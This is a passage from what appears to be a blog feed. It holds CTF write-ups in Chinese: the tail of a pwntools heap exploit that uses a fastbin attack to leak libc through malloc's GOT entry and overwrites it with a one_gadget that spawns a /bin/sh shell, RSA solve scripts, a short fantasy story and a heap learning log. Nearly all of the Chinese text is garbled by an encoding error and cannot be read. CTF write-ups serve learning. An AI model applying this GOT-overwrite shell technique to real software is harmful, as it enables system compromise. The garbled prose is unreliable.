&gt;&#x27;,str(1))</span><br><span class="line">  io.sendlineafter(&#x27;Please choose pipe: &#x27;, str(index))</span><br><span class="line">  io.sendlineafter(&#x27;Plese input info &gt;&#x27;,content)</span><br><span class="line">  io.sendline()</span><br><span class="line"></span><br><span class="line"># def show(index):</span><br><span class="line">#   io.sendlineafter(&#x27;&gt; &#x27;, str(1))</span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">content1 = &#x27;a&#x27;*8</span><br><span class="line">content2 = &#x27;b&#x27;*80</span><br><span class="line"></span><br><span class="line">alloc(0x30,content1,content2) # 12</span><br><span class="line">alloc(0x30,content1,content2) # 13</span><br><span class="line">free(12)</span><br><span class="line">free(13)</span><br><span class="line">content = p64(0x60418f)</span><br><span class="line">edit(13,content)</span><br><span class="line">alloc(0x30,content1,content1) # 14</span><br><span class="line"></span><br><span class="line">malloc_got = elf.got[&#x27;malloc&#x27;]</span><br><span class="line">content1 = b&#x27;\x00\x00\x00\x01\x00\x00\x02\x40\x00&#x27; + p64(malloc_got) + p64(malloc_got)</span><br><span class="line">alloc(0x30,content1,content1) # 15</span><br><span class="line">io.sendlineafter(&#x27;&gt; &#x27;, str(1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># io.sendlineafter(&#x27;&gt; &#x27;, str(11))</span><br><span class="line"># io.sendlineafter(&#x27;&gt; &#x27;, str(1))</span><br><span class="line">malloc_addr = u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(&#x27;puts_addr   ---&gt;   &#x27;,hex(malloc_addr))</span><br><span class="line">libc_base = malloc_addr - libc.sym[&#x27;malloc&#x27;]</span><br><span class="line">print(&#x27;libc_base   ---&gt;   &#x27;,hex(libc_base))</span><br><span class="line">og = [0x4f2a5,0x4f302,0x10a2fc]</span><br><span class="line">get_shell = libc_base + og[2]</span><br><span class="line">print(&#x27;libc_base   ---&gt;   &#x27;,hex(get_shell))</span><br><span class="line">content = p64(get_shell)</span><br><span class="line">io.sendline()</span><br><span class="line">edit(2,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">0x4f2a5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rsp &amp; 0xf == 0</span><br><span class="line">  rcx == NULL</span><br><span class="line"></span><br><span class="line">0x4f302 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x40] == NULL</span><br><span class="line"></span><br><span class="line">0x10a2fc execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>ä¸ºäº†å†™è¿™é¢˜æˆ‘è¿˜ç‰¹æ„å†™äº†ä¸ª exp_local.py æ¥æµ‹è¯•æœ¬åœ°é«˜ç‰ˆæœ¬libcçš„å †..</p>
</blockquote>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><blockquote>
<p>æ²¡æƒ³åˆ° ak çš„å±…ç„¶æ˜¯å¯†ç ï¼Œè¿™ä¿©éƒ½æ˜¯æ¿å­é¢˜</p>
</blockquote>
<h2 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h2><p>è¿™é¢˜ä¸¤ä¸ªæ•°çš„ä½ç½®åäº†ğŸ˜­å¡äº†å¥½é•¿æ—¶é—´æ¥ç€ï¼Œæˆ‘è¯´ä¸ºä»€ä¹ˆ getPrime ç”Ÿæˆçš„ p æ€ä¹ˆä¼šä¸æ˜¯ç´ æ•°</p>
<p>è¿™é¢˜ä¸€çœ¼æ±‚è§£äºŒæ¬¡å‰©ä½™ï¼Œå…¬é’¥è¯¾ä¸Šå­¦è¿‡(æ²¡æƒ³åˆ°è¯¾å ‚ä¸Šçš„ä¸œè¥¿èƒ½æ‹¿æ¥æ‰“CTF)ï¼Œä»ç½‘ä¸Šæ‰’ä¸€ä¸ªè„šæœ¬ç›´æ¥è§£<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p=13107939563507459774616204141253747489232063336204173944123263284507604328885680072478669016969428366667381358004059204207134817952620014738665450753147857</span><br><span class="line">a=4124820799737107236308837008524397355107786950414769996181324333556950154206980059406402767327725312238673053581148641438494212320157665395208337575556385</span><br><span class="line"></span><br><span class="line">k=0</span><br><span class="line">import gmpy2</span><br><span class="line">import sympy</span><br><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line">P=(p-1)</span><br><span class="line">if p%4==3:</span><br><span class="line">    print(gmpy2.powmod(a,int((p+1)//4),p))</span><br><span class="line">    print(-gmpy2.powmod(a,int((p+1)//4),p))</span><br><span class="line">else:</span><br><span class="line">    while P%2==0:</span><br><span class="line">        P=P//2</span><br><span class="line">        k=k+1</span><br><span class="line">    q=2</span><br><span class="line">    while q: </span><br><span class="line">        l=gmpy2.powmod(q,int((p-1)//2),p)</span><br><span class="line">        if l==p-1:</span><br><span class="line">            break</span><br><span class="line">        q=sympy.nextprime(q)</span><br><span class="line">    b=gmpy2.powmod(q,P,p)</span><br><span class="line">    x=[0 for i in range(k)]</span><br><span class="line">    re_a=gmpy2.invert(a,p)</span><br><span class="line">    x[k-1]=gmpy2.powmod(a,int((P+1)//2),p)</span><br><span class="line">    for i in range(1,k):</span><br><span class="line">        m=re_a*pow(x[k-i],2)</span><br><span class="line">        n=pow(2,(k-i-1))</span><br><span class="line">        if gmpy2.powmod(m,n,p)==p-1:</span><br><span class="line">            j0=1</span><br><span class="line">            x[k-i-1]=x[k-i]*pow(b,j0*(2**(i-1)))%p</span><br><span class="line">        else:</span><br><span class="line">            j1=0</span><br><span class="line">            x[k-i-1]=x[k-i]%p</span><br><span class="line">print(long_to_bytes(p-x[0]))</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.imgs.ovh/2023/11/19/H0sMV.png" alt=""></p>
<h2 id="hdRSA"><a href="#hdRSA" class="headerlink" title="hdRSA"></a>hdRSA</h2><p>3:00-5:00å°±åœ¨æ‰¾è¿™é“é¢˜çš„å…³é”®è¯â€¦</p>
<p>ä» â€œrsa ç‰¹æ®Šæ„é€ pâ€ åˆ° â€œrsa D<em>V*</em>2+1â€ å†åˆ° â€œrsa 4p+1â€ï¼Œç»ˆäºè®©æˆ‘æ‰¾åˆ°æœ‰ç”¨çš„ä¸œè¥¿äº†ï¼Œä»<a href="https://lazzzaro.github.io/2020/05/06/crypto-RSA/index.html">Lazzzaroçš„è¿™ç¯‡åšå®¢</a>é‡Œï¼Œæ‰¾åˆ°äº†<a href="https://github.com/crocs-muni/cm_factorization/tree/master">è¿™ä¸ªå·¥å…·</a>,ç›´æ¥ tmux å››ä¸ªçª—å£æ¢­å“ˆéå† Dï¼</p>
<p><img src="https://i.imgs.ovh/2023/11/19/H0KdW.png" alt=""></p>
<p>åˆ†è§£å‡º pq æ¥ä»¥åå°±æ˜¯å¸¸è§„ rsa äº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line">e = 65537</span><br><span class="line">c = 187275367513186345104534865239994699892170904489725413330767115192172530253625393062151741036312498277557971553595091826062438445856091864605758318579599363539202154625683947568962358702545878760994434813222953503460910447662183200334960821110618746899798165363389255347363192576250804362413854445821046755759458439443253294822553986237695607000569717855942461517564526611106601774100617668231506539201297550376834067118784548951699927659889815770492684106287801610261026674778509245649501695344652216367741171392139049785280654043804502329999760613658697298671602787929199239524617160567336634126185042907593427921016129734757065504417112269027028799047579450965076835882020261162192475637278445255805339324893626400179818784574957669576516363342104273184813708475202313539634027764340858242764934872804570810575764191987921655276520658100755510986290562980055133376750812535713567917823663134974180449002466833109112866681229626239871954125027501071383217816313440079294139254989413050731511516498127225020975071747314764552267845933494600295296885808466296844091612401062566502515356974852161817112538289440970059783116540091633055220150093646069438113246518726017868258339512247175386052684861670431148484455765445960495130308147156436998327553854387741014177421559585683382003377803158283603889312107837885491964835073892174406797445622388505256985237867456926792546588756970045576002345376035346727906264683596628903417932566383221754976804148878057310066885140776352202510584461556988179369177560403923399529842871087532495739921906849249072433614545319458973155343802539527630971239359995893495205324483418191744545506744253222956232506980824457995662900264427265978239540089825733734306363153471606200228841997928021468359645661221933848545854596097640552489404777927679709089475954033350287287833943519423030861868256961619722983499902810335</span><br><span class="line">n = 330961752887996173328854935965112588884403584531022561119743740650364958220684640754584393850796812833007843940336784599719224428969119533284286424077547165101460469847980799370419655082069179038497637761333327079374599506574723892143817226751806802676013225188467403274658211563655876500997296917421904614128056847977798146855336939306463059440416150493262973269431000762285579221126342017624118238829230679953011897314722801993750454924627074264353692060002758521401544361385231354313981836056855582929670811259113019012970540824951139489146393182532414878214182086999298397377845534568556100933934481180701997394558264969597606662342898026915506749002491326250792107348176681795942799954526068501499100232598658650184565873243525176833451664254917655703178472944744658628534195346977023418550761620254528178516972066618936960223660362493931786389085393392950207048675797593816271435700130995225483316625836104802608163745376633884840588575355936746173068655319645572100149515524131883813773486917122153248495022372690912572541775943614626733948206252900473118240712831444072243770979419529210034883903111038448366933374841531126421441232024514486168742686297481063089161977054825621099768659097509939405315056325336120929492838479309609958696957890570295444494277819063443427972643459784894450787015151715676537385237767990406742547664321563688829289809321534752244260529319454316532580416182438749849923354060125229328043961355894086576238519138868298499249023773237770103057707912709725417033309061308880583988666463892828633292839968866953776989722310954204550783825704710017434214644199415756584929214239679433211393230307782953067246529626136446314941258877439356094775337541321331600788042698664632064112896956898222397445497695982546922871549828242938368486774617350420790711093069910914135319635330786253331223459637232106417577225350441291</span><br><span class="line">p = 16486456392568284654575447481741337432037045210800881835922614280067095597403710005455885867829534599108105197853120121574779191481125315722964257888873579099800690068397728960335561315717619132097747891006990987234219773215951341290375325467839650020485843410133760476863038747605417567970738312428198804291743647184526806692092507258393049800262129700391618652453916902141512582838357424455278388992820311182042750759628796263458005206211851622898042001270110860445227518098099442496544291487453616861604254291750411887857595093636553437331170435660475454672143330589299824376076547689051724844786337326281769222107417355877587836699896745726567628092282995399905968099655245359825181671342180522153867520458557378100805495885728965517124749113185924078688116625743891547407248459361185534137655598794841381345072595952173547088910141316887889085791098603541066183857855045537851225348728432140633429582547355875169018387146998010651697236311238281309072462571334886501953441278420091394620498419461947569630534013992500053942893075863031452593127978173868322268503740398804653340332478754797272662812261231775395620689300949393859423566492311584685742006804194387349833713097736389655660701086473349762351032974011890884285149086019 </span><br><span class="line">q = 20074765917385746960935546244046943454462816043103272528361092579826674512173765241930755746125701611787832050933381141287876969868161022364171839735197812750520430729316788310479069323911390204105953536522038545353910488349500120367222425966798487691717708110938190921291433703777234979917798631930961003842873264252345740246004565354378673284300771278077629291983142857452945395644496169376540506242324806217396415838590757988653416655884020806407076836843763182293453375883193557418497971808909707169877529993060558008071543221829096316946680943004116896967543999782332968077171180309491946947119885153993121862489</span><br><span class="line">print(&#x27;q*p = &#x27;,q*p,&#x27;\n&#x27;)</span><br><span class="line">if n == p*q:</span><br><span class="line">    print(&#x27;n == p * q&#x27;)</span><br><span class="line">else:</span><br><span class="line">    print(&#x27;n != p * q&#x27;)</span><br><span class="line">    print(n-p*q)</span><br><span class="line">print(&#x27;n-q = &#x27;,n-q,&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">phi = (p-1)*(q-1)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = pow(c,d,n)</span><br><span class="line"></span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>WP</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>å¼‚ä¸–ç•Œè§é—»å½•(1)</title>
    <url>/2023/08/04/blog2/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
æˆ‘ä¸æƒ³æ²‰åœ¨æ— äººé—®æ´¥çš„æµ·åº•ï¼Œåªå¥½æŠŠç™»é¡¶ä½œä¸ºæˆ‘çš„ç†æƒ³
</blockquote>

<span id="more"></span>
<p>&emsp;&emsp;é›¨å°šæœªåœæ­‡ã€‚<br>&emsp;&emsp;æ´¾æ–¯å¦æ“¦æ‹­ç€æ‰‹é‡Œç™½è‰²çš„é•¿åˆ€ï¼Œç¯ç«å™¼å•ªçš„å£°éŸ³å›å“åœ¨å±±æ´çš„æ·±å¤„ã€‚è¿™é‡Œæ˜¯æµ·ç‰¹å±±å³°çš„æ—çº¿ï¼Œè¿ç»µä¸æ–­çš„å°é›¨è®©æ£®æ—è”“å»¶åˆ°æé«˜çš„æµ·æ‹”ï¼Œä¹Ÿè®©è¦†ç›–ç€åœŸå£¤çš„åœ°é¢åŒ–ä¸ºæ³¥æ²¼ã€‚<br>&emsp;&emsp;è¿œå¤„çš„ä¹Œäº‘è¤ªå»äº†å¤œè‰²ï¼Œæ˜­ç¤ºç€é»æ˜çš„åˆ°æ¥ã€‚<br>&emsp;&emsp;â€œä»Šå¤©è¿˜è¦å‘ä¸Šèµ°å—ï¼Ÿâ€æˆ‘é—®é“ã€‚<br>&emsp;&emsp;æ´¾æ–¯å¦æ”¶èµ·æ‰‹ä¸­æ“¦æ‹­åˆ€å…·çš„å¸ƒï¼Œæ‹¿èµ·ä¸€æ ¹æ¶åœ¨ç¯ç«æ—çš„ç²—æ ‘æï¼Œä¸Šé¢è¿˜ä¸²ç€ä¸æ˜ç”Ÿç‰©çš„è‚‰ï¼Œç»è¿‡ç«ç„°çš„ç‚™çƒ¤ï¼Œè®©äººåˆ†ä¸å‡ºé‚£é»‘è‰²ç©¶ç«Ÿæ˜¯ç‚­è¿˜æ˜¯è‚‰æœ¬æ¥çš„é¢œè‰²ã€‚<br>&emsp;&emsp;ä»–è‡ªé¡¾è‡ªåœ°åƒäº†èµ·æ¥ï¼Œå¹¶æ²¡æœ‰å›ç­”æˆ‘çš„é—®é¢˜ã€‚çœ‹ç€æ´¾æ–¯å¦åƒå¾—æ´¥æ´¥æœ‰å‘³ï¼Œæˆ‘ä¹Ÿæ‹¿èµ·ä¸€ä¸²ï¼Œè½»è½»æ’•ä¸‹ä¸€å—æ”¾åœ¨å˜´é‡Œã€‚<br>&emsp;&emsp;è‹¦æ¶©ç¬é—´åœ¨å˜´é‡Œçˆ†å¼€ã€‚ç‚™çƒ¤åçš„è‚‰å‡ ä¹æ²¡æœ‰æ°´åˆ†ï¼Œè®©å’€åš¼å˜å¾—ååˆ†å›°éš¾ï¼Œè€Œä¸”è¿˜æ•£å‘ç€ä»¤äººæŠ—æ‹’çš„å‘³é“ï¼Œæˆ‘å®åœ¨éš¾ä»¥åƒä¸‹ç¬¬äºŒå£ï¼Œä¾¿æŠŠè‚‰æ”¾å›äº†ç¯ç«æ—ã€‚<br>&emsp;&emsp;æ´¾æ–¯å¦ä¹Ÿä¸åœ¨ä¹ï¼Œä»–åªæ˜¯å‘å¤–èµ°ï¼Œå°†è¦†ç›–åœ¨æ´å£çš„ææ¡æ€å¼€ä¸€ä¸ªå°è§’ï¼Œä¾§èº«ç«™åœ¨æ´ç©´è¾¹ç¼˜ï¼Œå°å¿ƒç¿¼ç¿¼åœ°ç”¨çœ¼ç›è§‚å¯Ÿå¤–é¢çš„æƒ…å†µã€‚ç¨è®¸ï¼Œä»–èµ°äº†å›æ¥ï¼Œå¼€å§‹æ”¶æ‹¾è‡ªå·±çš„åŒ…è£¹ã€‚<br>&emsp;&emsp;å¤©è¿˜åªæ˜¯è’™è’™äº®ï¼Œåšåšçš„é»‘äº‘è®©å…‰çº¿å˜å¾—æ›´åŠ é»¯æ·¡ã€‚çœ‹åˆ°æ´¾æ–¯å¦è¦ç¦»å¼€ï¼Œæˆ‘ä¹Ÿå¼€å§‹æ”¶æ‹¾è¡Œå›Šã€‚<br>&emsp;&emsp;â€œå±±é¡¶ä¸Šç©¶ç«Ÿæœ‰ä»€ä¹ˆä¸œè¥¿ï¼Œè¿™ä¹ˆå€¼å¾—ä½ æ¢å¯»ï¼Ÿâ€æˆ‘çœ‹ç€æ´¾æ–¯å¦å°†ç…®å¼€çš„çƒ­æ°´å€’è¿›æ¯ä¸­ï¼Œå¿ä¸ä½å¼€å£é—®é“ã€‚<br>&emsp;&emsp;â€œä¸çŸ¥é“ã€‚â€æ´¾æ–¯å¦çš„å›ç­”ååˆ†ç®€çŸ­ã€‚<br>&emsp;&emsp;è¯éŸ³åˆšè½ï¼Œä»–å¸¦ä¸Šé¿æ°´æ–—ç¬ ï¼Œç”¨é•¿åˆ€æŒ‘å¼€ææ¡å‘å¤–èµ°å»ï¼Œæˆ‘æ²¡æ¥å¾—åŠè¿½é—®ï¼Œåªèƒ½å¿«æ­¥è·Ÿç€ä»–èµ°å‡ºæ´ç©´ã€‚å¯åˆšèµ°åˆ°æ³¥åœŸä¸Šæˆ‘å°±è¿…é€Ÿé™·äº†ä¸‹å»ï¼Œå°±å¥½åƒè¿™è¢«é›¨æ°´æµ¸é€çš„æ³¥åœŸè¦å›«å›µå°†æˆ‘åå™¬ã€‚æˆ‘åƒåŠ›åœ°å°†è„šæ‹”å‡ºï¼Œå´çœ‹åˆ°æ´¾æ–¯å¦ä¹Ÿæ­£ååˆ†å›°éš¾åœ°å‰è¿›ï¼Œæˆ‘ä¸ç¦æ„Ÿåˆ°æ‹…å¿§ï¼Œä½•æ—¶æ‰èƒ½åˆ°è¾¾è¿™ç›´è€¸å…¥äº‘çš„å±±å·…ï¼Ÿ<br>&emsp;&emsp;â€œè½°â€”â€”â€ä¸€åªç´«é»‘è‰²çš„æ‰‹è‡‚æ‰¬èµ·ä¸€å¤§ç‰‡æ³¥åœŸï¼Œä»ç¦»æˆ‘ä»¬ä¸è¿œçš„åœ°åº•ä¼¸äº†å‡ºæ¥ã€‚è¿™æ‰‹è‡‚è¿‘ä¸€äººé«˜ï¼Œæ‰‹æŒèƒ½å°†æˆ‘çš„å¤´é¢…è½»æ˜“æŠ“èµ·ã€‚ææƒ§å¡«æ»¡äº†æˆ‘çš„å¤§è„‘ï¼Œè®©æˆ‘è¿…é€Ÿå‘æ´å£è·‘å»ï¼Œå¯ç²˜æ€§æå¼ºçš„åœŸå£¤æ­»æ­»çš„å¸é™„ä½æˆ‘çš„åŒè…¿ï¼Œè®©æˆ‘éš¾ä»¥åŠ¨å¼¹ã€‚<br>&emsp;&emsp;çªç„¶ï¼Œé‚£æ€ªç‰©æ‰‹æŒå‘æ´¾æ–¯å¦æ‹å»ï¼Œå·¨å¤§çš„å“å£°åœ¨æˆ‘è€³æ—ç‚¸èµ·ï¼Œéšåæ˜¯æº…èµ·çš„æ³¥æ°´ã€‚ä¸€å‡»ä¸æˆï¼Œè¿™æ‰‹è‡‚åˆå¼€å§‹è •åŠ¨ï¼Œæƒ³è¦è„±ç¦»æ³¥æ²¼çš„å¸é™„ï¼Œå‘æ´¾æ–¯å¦æ¨ªæ‰«è¿‡å»ã€‚<br>&emsp;&emsp;â€œé“®â€”â€”â€é•¿åˆ€å‡ºé˜ï¼Œç™½è‰²çš„åˆ€å…‰è¿…é€ŸåŠˆåœ¨ç´«é»‘è‰²çš„æ‰‹æŒä¸Šï¼Œä½¿å¾—é»‘è‰²çš„è¡€ç®¡ç¬é—´å¼ å¼€ä¸€ä¸ªç‹°ç‹çš„è£‚ç¼ï¼Œè¡€æ¶²ä¸ç¢è‚‰è¿¸æº…åœ¨æ´¾æ–¯å¦çš„æ–—ç¬ ä¸æŠ«é£ä¸Šï¼Œè€Œåè¢«æ¸å¤§çš„é›¨åŠ¿å†²æ´—å¹²å‡€ã€‚<br>&emsp;&emsp;é‚£æ‰‹è‡‚æ²¡äº†åŠ¨é™ã€‚<br>&emsp;&emsp;æˆ‘é•¿èˆ’ä¸€å£æ°”ï¼Œå´çœ‹åˆ°æ´¾æ–¯å¦åˆ‡ä¸‹æ€ªç‰©æ‰‹è‡‚çš„ä¸€å—è‚Œè‚‰ï¼Œåœ¨é›¨æ°´ä¸­æ´—æ¶¤å¹²å‡€åè£…è¿›åŒ…é‡Œã€‚ä¸æ„‰å¿«çš„æ—©é¤ç»å†è¿…é€Ÿæ¶Œä¸Šè„‘æµ·ï¼Œæˆ‘æ„Ÿåˆ°èƒƒä¸­ä¸€é˜µç¿»æ¶Œã€‚<br>&emsp;&emsp;â€œè¿™å±±è¿™ä¹ˆå±é™©ï¼Œä¸ºä»€ä¹ˆè¿˜è¦åšæŒçˆ¬åˆ°å±±é¡¶å•Šï¼Ÿâ€ä¸ºäº†è½¬ç§»æ³¨æ„åŠ›ï¼Œæˆ‘åˆæ¬å‡ºä»Šæ—©çš„é—®é¢˜ã€‚<br>&emsp;&emsp;â€ä¸çŸ¥é“ï¼Œâ€œæ´¾æ–¯å¦å°†ç›®å…‰ç§»å‘æˆ‘ï¼Œâ€å¯æ˜¯å±±è„šå·²ç»è¢«ä¸æ–­ä¸Šæ¶¨çš„å²æœˆä¹‹æµ·æ·¹æ²¡ï¼Œæˆ‘åˆ°äº†åŠå±±è…°ï¼Œå·²ç»æ²¡æœ‰ä¸‹å±±çš„ä½™åœ°äº†ã€‚æˆ‘ä¸æƒ³æ²‰åœ¨æ— äººé—®æ´¥çš„æµ·åº•ï¼Œåªå¥½æŠŠç™»é¡¶ä½œä¸ºæˆ‘çš„ç†æƒ³ã€‚â€œ<br>&emsp;&emsp;æˆ‘å¹¶ä¸æ¸…æ¥šå±±è„šçš„æƒ…å†µï¼Œåªèƒ½ç³Šé‡Œç³Šæ¶‚åœ°è·Ÿç€æ´¾æ–¯å¦ç»§ç»­å‰è¡Œã€‚è¿™å‡ å°æ—¶çš„æ—…é€”å¹¶æ— å±æœºï¼Œå±±è„‰ä¹Ÿä¸é™¡å³­ï¼Œè·Ÿç€ä¸Šå‡çš„æµ·æ‹”ï¼Œæˆ‘ä»¬èµ°åˆ°äº†ä¸€ç‰‡æ—·é‡ã€‚<br>&emsp;&emsp;é›¨æ°´è®©èƒ½è§åº¦å˜å¾—éå¸¸ä½ï¼Œå¯å‰æ–¹ä¼¼ä¹æµ®ç°å‡ºäº†ç™½è‰²çš„é›ªçº¿ï¼Œè¿™æ„å‘³ç€ç™»é¡¶ä¹‹æ—…å³å°†è¿ˆå…¥æ–°çš„é˜¶æ®µï¼Œè€Œé›ªåœ°ä¹Ÿä¼šæ¯”æ³¥æ²¼è¦å¥½èµ°ä¸€äº›ã€‚<br>&emsp;&emsp;â€è½°â€”â€”â€œç´«é»‘è‰²çš„æ‰‹è‡‚æ“¦ç€æˆ‘çš„è„¸é¢Šä»åœ°åº•å†’å‡ºï¼Œå·¨å¤§çš„å†²å‡»åŠ›æŠŠæˆ‘æ€ç¿»åœ¨åœ°ã€‚æˆ‘æƒŠæ…Œåœ°çœ‹å‘æ´¾æ–¯å¦ï¼Œå´å‘ç°ä»–çš„èº«è¾¹ä¹Ÿå†’å‡ºäº†ä¸€åªæ€ªç‰©æ‰‹è‡‚ã€‚<br>&emsp;&emsp;æˆ‘æƒ³ä»åœ°ä¸Šçˆ¬èµ·ï¼Œå¯æ˜¯è¿™æ¬¡æ³¥æ²¼å½»åº•å°†æˆ‘ç²˜åœ¨åœ°é¢ï¼Œå€åœ°ï¼Œæˆ‘èº«è¾¹çš„é‚£åªæ€ªç‰©æ‰‹è‡‚åœ¨æˆ‘çœ¼å‰è¿…é€Ÿæ”¾å¤§ï¼Œæˆ‘ç”¨å°½å…¨èº«åŠ›æ°”å°†è‡ªå·±çš„æ‰‹è‡‚æŠ¬èµ·ï¼Œæƒ³è¦æŠµæŒ¡è¿™æ¯”æˆ‘ä¸ŠåŠèº«è¿˜å®½çš„æ‰‹æŒï¼Œå´è¢«æ·±æ·±åœ°æ‹è¿›æ³¥æ²¼å½“ä¸­ã€‚<br>&emsp;&emsp;æˆ‘å¬è§äº†éª¨éª¼ç¢è£‚çš„å£°éŸ³ï¼Œéšåæ³¥æ°´çŒè¿›äº†æˆ‘çš„è€³æœµã€‚æˆ‘æ„Ÿå—åˆ°é‚£æ€ªç‰©æ‰‹æŒæ­£è¿…é€Ÿæ¡ç´§ï¼Œå› ä¸ºå‘¨å›´çš„æ³¥åœŸæ­£åœ¨ä¸æ–­åœ°æŒ¤å‹æˆ‘çš„èº«ä½“ã€‚<br>&emsp;&emsp;åœ¨æ„è¯†æ¶ˆæ•£ä¹‹å‰ï¼ŒæåŠ›å‘å¤–ä¸€ç¥â€”â€”<br>&emsp;&emsp;æˆ‘çœ‹è§é£˜æ‘‡çš„é£é›ªï¼Œçœ‹è§å‚æš®çš„æ—·é‡ï¼Œçœ‹è§æŒ¥èˆç€é•¿åˆ€çš„æ´¾æ–¯å¦ï¼Œç”¨åšå®šé©±æ•£ç€å­¤å•ã€‚  </p>
]]></content>
      <categories>
        <category>sketch</category>
      </categories>
  </entry>
  <entry>
    <title>HeapLearningLog1</title>
    <url>/2023/08/24/blog4/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
å­¦ä¹ è¿˜æ˜¯è¦å†™ç‚¹æ—¥å¿—æ‰æœ‰æ„æ€
</blockquote>

<span id="more"></span>
<h2 id="è¯´åœ¨å‰é¢"><a href="#è¯´åœ¨å‰é¢" class="headerlink" title="è¯´åœ¨å‰é¢"></a>è¯´åœ¨å‰é¢</h2><blockquote>
<p>å…³äºåšå®¢</p>
</blockquote>
<p>å¹³æ—¶é€šè¿‡æœç´¢å­¦ä¹ æ—¶ï¼Œç»å¸¸ä¼šé‡åˆ°ä¸€äº›å¸æ”¶èµ·æ¥ç‰¹åˆ«å›°éš¾åšå®¢ï¼Œè¿™äº›åšå®¢å¤§å¤šæ˜¯åšä¸»çš„å¤–è„‘ï¼Œåšä¸»çœ‹åˆ°è‡ªå·±çš„åšå®¢å¯èƒ½é©¬ä¸Šèƒ½ç†è§£è‡ªå·±å†™äº†ä»€ä¹ˆï¼Œæˆ–è€…çŸ¥é“è¯¥æ€ä¹ˆæ£€ç´¢è¿™ç¯‡åšå®¢ã€‚ä½†å¯¹äºè¯»è€…ï¼Œè¿™ç¯‡åšå®¢å‡ ä¹æ²¡æœ‰ä»€ä¹ˆç”¨â€¦â€¦æœç´¢å¼•æ“æŠŠè¿™ç¯‡åšå®¢æ‹‰è¿‡æ¥çº¯å±æµªè´¹è¯»è€…çš„æ—¶é—´ã€‚<br>æ‰€ä»¥æˆ‘å¸Œæœ›è‡ªå·±å…³äºå­¦ä¹ çš„blogï¼Œèƒ½å¤Ÿè®©ä¸€ä¸ª0åŸºç¡€çš„è¯»è€…ä»å¤´åˆ°å°¾è¯»å®Œå¹¶ä¸”å¸æ”¶è¿™ç¯‡blogçš„å†…å®¹ã€‚å†ä¸æµä¹Ÿè¦è®©è¯»è€…æ„Ÿåˆ°æœ‰ç”¨ã€‚è€Œå¤–è„‘æ”¾åœ¨æœ¬åœ°å³å¯ã€‚  </p>
<blockquote>
<p>å…³äºLearningLog</p>
</blockquote>
<p>æˆ‘åœ¨å­¦ä¹ njuçš„PAæ—¶å†™è¿‡ä¸€æ®µæ—¶é—´çš„learninglogï¼Œç›®çš„æ˜¯å¼ºè¿«è‡ªå·±è¾“å‡ºä»¥è¾¾åˆ°æ›´å¥½çš„ç†è§£ï¼Œreview logä¹Ÿå¯ä»¥è®©è‡ªå·±å…³æ³¨å¥½è‡ªå·±çš„å­¦ä¹ åŠ¨æ€<del>ï¼ˆç¥ç²¾æ€çŠ¶ï¼‰</del><br>å¯¹äºè¯»è€…ï¼Œlearninglogå¯ä»¥ç»™åˆ°å€Ÿé‰´ä½œç”¨ï¼Œåœ¨å­¦ä¹ è¿‡ç¨‹ä¸­èµ·åˆ°å¯¹ç…§ä½œç”¨ï¼Œä¸è‡³äºæ‹…å¿§è‡ªå·±çš„å­¦ä¹ è¿›åº¦ã€‚</p>
<hr>
<h2 id="2023-08-24"><a href="#2023-08-24" class="headerlink" title="2023/08/24"></a>2023/08/24</h2><p>å·²ç»8.25äº†ã€‚ã€‚ã€‚<br>hacknoteé‚£é“é¢˜ï¼Œè¿˜æ˜¯ç”¨fastbinæœºåˆ¶å°†heapListè¿›è¡Œä¿®æ”¹ï¼Œç„¶åUAFè¿›è¡Œleakå’Œææƒã€‚<br>ç°åœ¨åšé¢˜æ„Ÿè§‰è¿˜æ˜¯ä¸å¤Ÿçµæ´»ï¼Œçœ‹åˆ°å¥½å¤šdaiä½¬åœ¨å¤§ä¸€ç»“æŸçš„æ—¶å€™Pwnå°±å·²ç»å¾ˆå¼ºäº†â€¦æˆ‘è¿™åŠé“å‡ºå®¶å®åœ¨æ²¡çœ¼çœ‹ã€‚<br>æ‰€ä»¥åªå¥½æˆä¸ºèµ›æ£äº†(<br>æ‹¿é«˜è€ƒæ•°å­¦æ¥ä¸¾ä¾‹ï¼Œæˆ‘ç°åœ¨ä¸æ˜¯120æåˆ°140ï¼Œè€Œæ˜¯20æåˆ°40åˆ†ã€‚<br>åŠ æ²¹å§â€¦ä»»é‡é“è¿œ</p>
<h2 id="2023-08-25"><a href="#2023-08-25" class="headerlink" title="2023/08/25"></a>2023/08/25</h2><p>å¥½å¥½å¥½ï¼Œæ•´äº†ä¸€å¤©æ–°ç”Ÿèµ›ï¼Œæœ‰ç‚¹æµ®èºã€‚<br>å¼¹äº†ä¼šå„¿å‰ä»–ç°åœ¨æ‰ç¨å¾®å¥½ç‚¹<br>å¼€æ•´ï¼</p>
